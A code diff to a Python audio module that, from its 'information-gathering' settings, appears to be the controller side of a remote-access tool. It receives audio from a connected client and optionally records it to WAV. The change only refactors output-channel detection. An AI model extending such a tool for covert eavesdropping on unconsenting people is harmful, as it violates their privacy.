@@ -18,10 +18,6 @@ from domestic.global_state import *
 @internal_server_error_exception_handling
 def audio_action(write_stream):
   try:
-    CHUNK = 81920
-    FORMAT = pyaudio.paInt16
-    RATE = 44100
-    channels = 2
     headersize = state['settings']['headersize']
     encryption = state['settings']['encryption']
     encoding = state['settings']['encoding']
@@ -30,11 +26,12 @@ def audio_action(write_stream):
     frames = []
 
     p = pyaudio.PyAudio()
-    try:
-      stream = p.open(format=FORMAT, channels=channels, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
-    except:
-      channels = 1
-      stream = p.open(format=FORMAT, channels=channels, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
+    CHUNK = 81920
+    FORMAT = pyaudio.paInt16
+    RATE = 44100
+    CHANNELS = p.get_default_output_device_info()['maxOutputChannels']
+
+    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=False, output=True, frames_per_buffer=CHUNK)
     record = state['options']['information-gathering']['record']['audio']
 
     client, addr = state['sockets']['modules']['audio'][0].accept()
@@ -77,7 +74,7 @@ def audio_action(write_stream):
     write_error(err)
     try:
       if record:
-        make_wave(['modules', 'modules/audio'], client_obj[1], (channels, p, FORMAT, RATE, frames))
+        make_wave(['modules', 'modules/audio'], client_obj[1], (CHANNELS, p, FORMAT, RATE, frames))
 
       stream.stop_stream()
       stream.close()
